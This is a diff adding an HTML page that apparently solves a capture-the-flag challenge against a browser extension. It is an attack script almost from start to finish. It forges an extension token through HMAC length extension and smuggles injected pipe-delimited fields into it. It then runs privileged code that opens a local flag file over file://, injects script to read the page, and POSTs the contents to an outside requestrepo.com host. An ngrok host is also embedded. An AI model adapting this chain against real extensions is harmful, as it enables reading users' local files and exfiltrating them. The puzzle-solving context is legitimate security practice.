@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title></title>
+</head>
+<body>
+
+<form method="POST" id="credForm">
+	<input name="username" type="text" id="usernameField">
+	<input name="password" type="password" id="passwordField">
+	<input name="submit" type="submit">
+</form>
+
+<script>
+// hash extend. we can match 380 to 124 (ż to |). ż -> l 380
+
+// the solver doesn't automatically do the dir listing but sending the admin bot several times works
+const PRIVILEGED_FUNC = () => {
+	console.log("hey");
+
+	chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
+		console.log(request);
+		fetch("https://ewry1k7t.requestrepo.com", { method: "POST", body: request });
+	});
+
+	let func = () => {
+		chrome.runtime.sendMessage(document.body.innerHTML);
+	};
+
+	chrome.tabs.create({ url: "file:///home/user/E7pWthzKso/flag-IpseVE1YZ6.txt/flag2.txt" }, t => {
+		console.log(t.id, t);
+		chrome.tabs.executeScript(t.id, { code: `setTimeout(${func}, 500)` });
+	});
+};
+
+
+// extract hmac
+
+const sleep = d => new Promise(r => setTimeout(r, d));
+setTimeout(async () => {
+	let p = open("", "shadowframe").parent;
+	p.location = "about:blank";
+	await sleep(1000);
+	let crid = p.frameElement.src.match(/(chrome-extension:\/\/(.*?)\/)/)[1];
+	let hmac = p.frameElement.src.match(/hmac=(.*)/)[1];
+	let token = decodeURIComponent(p.frameElement.src.match(/token=(.*?)&/)[1]);
+	console.log(hmac, token);
+
+	let [ _, tabId ] = token.split("|");
+
+	// construct new token and hash extend
+
+	const payload = `
+
+
+|${tabId}|https://c50e-109-156-209-195.ngrok-free.app|evaluate|
+
+
+(${PRIVILEGED_FUNC.toString()})()
+
+
+|
+
+
+	`;
+
+	let [ inp, newHash ] = await (await fetch(`/hlextend?token=${encodeURIComponent(token)}&hash=${hmac}&inp=${payload}`)).json();
+	// replace first 5
+	let i = 5;
+	inp = atob(inp);
+	inp = inp.replaceAll("|", () => i--<=0 ? "|" : "ż");
+
+	console.log(inp, newHash);
+
+	await sleep(300);
+
+	let ifr = document.createElement("iframe");
+	ifr.src = `${crid}autofill.html?token=${encodeURIComponent(inp)}&hmac=${encodeURIComponent(newHash)}`
+	document.body.appendChild(ifr);
+
+	navigator.sendBeacon("/end", "lol");
+}, 1000);
+
+
+</script>
+
+</body>
+</html>
